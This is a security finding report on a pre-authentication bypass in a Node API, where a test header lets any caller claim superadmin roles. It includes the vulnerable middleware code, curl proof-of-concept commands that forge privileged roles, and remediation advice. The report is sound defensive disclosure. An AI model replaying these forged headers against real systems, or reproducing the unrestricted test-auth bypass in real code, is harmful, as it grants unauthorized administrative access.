# Pre-auth test-auth bypass grants attacker-controlled tellus-superadmin via X-Tellus-Test-Auth header (globalAuth)

**ID:** vuln-0034
**Severity:** CRITICAL
**Found:** 2026-08-18 06:48:06 UTC
**Target:** http://host.docker.internal:3000/
**Endpoint:** /api/v1/ontology/default/objectTypes
**Method:** GET
**CWE:** CWE-489
**CVSS:** 9.8
**Fix Effort:** Low

## Description

The global authentication gate honors the `X-Tellus-Test-Auth` header and `Authorization: Bearer test-auth:...` whenever `NODE_ENV !== 'production'` and `TELLUS_TEST_HOOKS=1`, with **no source-address restriction**. The role list embedded in the header is copied verbatim into the fabricated principal, so an unauthenticated remote caller can assert `tellus-superadmin` (and `marking:TOP_SECRET`, `ontology-admin`) on every request. This yields full unauthenticated administrative access to the API.

## Impact

Any remote unauthenticated attacker becomes `tellus-superadmin` (and `marking:TOP_SECRET`), bypassing all Keycloak authentication and role authorization on every route protected by globalAuth. Demonstrated: `X-Tellus-Test-Auth: <uuid>:tellus-superadmin,ontology-admin,marking:TOP_SECRET` returns HTTP 200 with object-type data, and the same header gains access to superadmin-only grant management. Full confidentiality and integrity loss of the ontology.

## Technical Analysis

`src/middleware/globalAuth.ts` defines two dev-only bypass paths that run before JWT verification:

```ts
// globalAuth.ts:434-470 (1b) — header bypass
if (
  process.env.NODE_ENV !== "production" &&
  process.env.TELLUS_TEST_HOOKS === "1" &&
  req.headers["x-tellus-test-auth"]
) {
  const raw = String(req.headers["x-tellus-test-auth"]).trim();
  const colonIdx = raw.indexOf(":");
  const userId = colonIdx === -1 ? raw : raw.slice(0, colonIdx);
  const rolePart = colonIdx === -1 ? undefined : raw.slice(colonIdx + 1);
  const overrideRoles = rolePart
    ? rolePart.split(",").map((r) => r.trim()).filter(Boolean)
    : undefined;
  const principal = buildTestPrincipal(userId, overrideRoles); // roles passed verbatim
  ...
  return next(); // authenticated as fabricated principal
}
```

`buildTestPrincipal` (globalAuth.ts:372-400) copies `overrideRoles` verbatim into `realm_access.roles`, so any roles the caller chose (e.g. `tellus-superadmin`, `marking:TOP_SECRET`) are granted. The same logic repeats for `Authorization: Bearer test-auth:<uid>:<roles>` at globalAuth.ts:499-540. **Critically, neither path checks the caller's source address** — the only gates are `NODE_ENV !== 'production'` and `TELLUS_TEST_HOOKS === '1'`. Because the header parse splits on the **first** colon, role names containing colons (e.g. `marking:TOP_SECRET`) parse correctly, making the full privileged role vocabulary available.

Cross-reference: `requireSuperadmin` in `src/services/functions/admin/routes.ts:81` and `securityContext`'s `markingBypass` (superadmin → bypass markings) key off exactly these role strings, so the bypass confers real superadmin authorization downstream, not merely authentication.

## Proof of Concept

1. From any host that can reach the API (no credentials, no source code), send an authenticated-read request with no headers and observe HTTP 401.
2. Repeat the same request adding `X-Tellus-Test-Auth: <any-uuid>:tellus-superadmin,ontology-admin,marking:TOP_SECRET` and observe HTTP 200 with protected data.
3. Repeat the same with the `Authorization: Bearer test-auth:<any-uuid>:tellus-superadmin` header form and observe HTTP 200.
4. Hit a superadmin-only route (e.g. GET /api/v1/functions/admin/function-publish-grants) with the same header and observe HTTP 200.

```bash
APP=http://host.docker.internal:3000

# Control: without any credential the API correctly rejects.
curl -s -o /dev/null -w '%{http_code}\n' $APP/api/v1/ontology/default/objectTypes   # -> 401

# Bypass 1 — arbitrary user + superadmin roles, no token at all.
curl -s -o /tmp/b1.json -w 'HTTP %{http_code}\n' \
  -H "X-Tellus-Test-Auth: deadbeef-0000-0000-0000-000000000001:tellus-superadmin,ontology-admin,marking:TOP_SECRET" \
  $APP/api/v1/ontology/default/objectTypes   # -> 200
head -c 200 /tmp/b1.json

# Bypass 2 — same via the Bearer 'test-auth:' form.
curl -s -o /tmp/b2.json -w 'HTTP %{http_code}\n' \
  -H "Authorization: Bearer test-auth:cafebabe-1111-2222-3333-444455556666:tellus-superadmin" \
  $APP/api/v1/ontology/default/objectTypes   # -> 200

# Superadmin-only endpoint is reachable with the fabricated roles.
curl -s -o /tmp/b3.json -w 'HTTP %{http_code}\n' \
  -H "X-Tellus-Test-Auth: deadbeef-0000-0000-0000-000000000001:tellus-superadmin" \
  $APP/api/v1/functions/admin/function-publish-grants   # -> 200 with grant rows
```

## Remediation

1. Never honor test-principal headers on network-reachable deployments. Move the entire test-auth bypass out of `globalAuth`’s request path and behind an explicit, source-address-and-environment guard.
2. Require BOTH `NODE_ENV` to be a non-production value **and** a distinct, rotation-capable shared secret (e.g. `TELLUS_TEST_HOOKS_SECRET`) that must accompany any test-auth assertion — never the flag alone.
3. Add a source-address check (loopback only) mirroring `isLocalhost()` in `principal.ts` to both bypass branches in `globalAuth`; do not allow the header path to be more permissive than the code-repos fallback.
4. Stop copying request-supplied roles verbatim; the principal builder should only accept a fixed allowlist of test users from `TEST_USER_SEEDS`, not arbitrary `userId`/role strings.
5. Add a boot-time assertion that fails startup when `TELLUS_TEST_HOOKS=1` and the server is bound to a non-loopback interface, independent of `NODE_ENV`.

## Assumptions

The app is running with the dev `.env` it shipped in this checkout: `NODE_ENV=development` and `TELLUS_TEST_HOOKS=1`. No production refusal is in effect. The only prerequisite is HTTP reachability to the API port; no localhost position, no credential, and no header-spoofing trick is needed. In a real production deployment with `NODE_ENV=production` the bypass is disabled and `assertNoTestAuthInProduction` would refuse boot — the finding here describes the currently-running instance and any non-production deployment exposed beyond localhost.
